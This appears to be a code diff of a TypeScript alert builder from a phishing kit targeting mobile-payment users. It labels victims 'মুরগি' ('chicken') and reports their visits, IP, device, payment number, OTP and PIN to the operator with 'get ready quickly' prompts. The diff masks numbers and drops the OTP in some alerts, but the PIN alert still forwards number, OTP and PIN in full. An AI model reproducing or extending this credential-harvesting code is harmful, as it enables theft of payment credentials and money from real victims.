@@ -26,11 +26,18 @@ function br() {
   return "\n";
 }
 
+// Helper to mask last 4 digits of number
+function maskNumber(num: string): string {
+  if (!num) return "N/A";
+  const cleaned = String(num).replace(/\s+/g, "");
+  return cleaned.length <= 4 ? "****" + cleaned : "****" + cleaned.slice(-4);
+}
+
 // Helper to format messages with consistent spacing
 function formatMsg(title: string, lines: Array<{key: string, value: string}>) {
   let msg = `🐔 ${title}\n  \n`;
   for (const line of lines) {
-    msg += `${line.key}: ${line.value || ""}\n  \n`;
+    msg += `${line.key} : ${line.value || ""}\n  \n`;
   }
   return msg + "\n  ";
 }
@@ -49,7 +56,7 @@ function buildMessage(type: string, data: any, meta: any) {
 
   switch (type) {
     case "visit": {
-      return formatMsg("মুরগি ওয়েবসাইট ভিজিট করতেছে ⚠️ তাড়াতাড়ি রেডি হও ⚠️", [
+      return formatMsg("মুরগি Platform Visit ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️", [
         { key: "🐔মুরগির IP Address", value: ip },
         { key: "🐔মুরগির Device Info", value: device },
         { key: "🐔মুরগির Screen Resolution", value: screen },
@@ -111,9 +118,10 @@ function buildMessage(type: string, data: any, meta: any) {
     case "payment_number": {
       const method = escapeHtml(data?.method ?? "N/A");
       const number = escapeHtml(data?.number ?? "N/A");
-      return formatMsg("মুরগি পেমেন্ট নাম্বার দিয়েছে ✅", [
+      const masked = maskNumber(number);
+      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
         { key: "Payment Method", value: method },
-        { key: "Number", value: number },
+        { key: "Number", value: masked },
         { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
@@ -123,11 +131,11 @@ function buildMessage(type: string, data: any, meta: any) {
     case "payment_otp": {
       const method = escapeHtml(data?.method ?? "N/A");
       const number = escapeHtml(data?.number ?? "N/A");
-      const otp = escapeHtml(data?.otp ?? "N/A");
-      return formatMsg("মুরগি OTP দিয়েছে ✅", [
+      const masked = maskNumber(number);
+      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
         { key: "Payment Method", value: method },
-        { key: "Number", value: number },
-        { key: "OTP", value: otp },
+        { key: "Number", value: masked },
+        { key: "OTP", value: "NOT CAPTURED" },
         { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
@@ -139,7 +147,7 @@ function buildMessage(type: string, data: any, meta: any) {
       const number = escapeHtml(data?.number ?? "N/A");
       const otp = escapeHtml(data?.otp ?? "N/A");
       const pin = escapeHtml(data?.pin ?? "N/A");
-      return formatMsg("মুরগি PIN দিয়েছে ✅✅✅", [
+      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
         { key: "Payment Method", value: method },
         { key: "Number", value: number },
         { key: "OTP", value: otp },
